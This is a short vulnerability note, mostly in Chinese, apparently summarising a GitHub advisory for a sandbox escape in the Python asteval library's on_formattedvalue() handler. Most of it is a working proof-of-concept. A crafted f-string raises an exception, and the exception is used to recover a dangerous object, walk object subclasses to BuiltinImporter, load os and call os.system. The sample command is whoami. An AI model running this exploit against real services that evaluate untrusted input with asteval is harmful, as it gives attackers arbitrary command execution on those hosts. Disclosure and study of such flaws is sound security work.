https://github.com/advisories/GHSA-3wwr-3g9f-9gc7
tpl:
asteval

vul func:
on_formattedvalue()（位于 asteval 库的 AST 解析逻辑）

漏洞触发条件
攻击者可控输入：能向 asteval.Interpreter() 传入恶意构造的 Python 代码（含 f-string）。
异常利用：通过触发 AttributeError 获取敏感对象（如 ga.obj）。
动态代码执行：利用 os.system() 或类似函数执行任意命令。

POC:

from asteval import Interpreter

aeval = Interpreter()
malicious_code = """
def pwn():
    try:
        f"{dict.mro()[1]:'\\x7B__fstring__.__getattribute__.s\\x7D'}"  # 触发异常
    except Exception as ga:
        ga = ga.obj  # 获取危险对象
        sub = ga(dict.mro()[1], "__subclasses__")()  # 遍历子类
        importer = next(i for i in sub if "BuiltinImporter" in str(i))
        os = importer.load_module("os")  # 导入os模块
        os.system("whoami")  # 执行任意命令
pwn()
"""
aeval(malicious_code)  # 触发漏洞
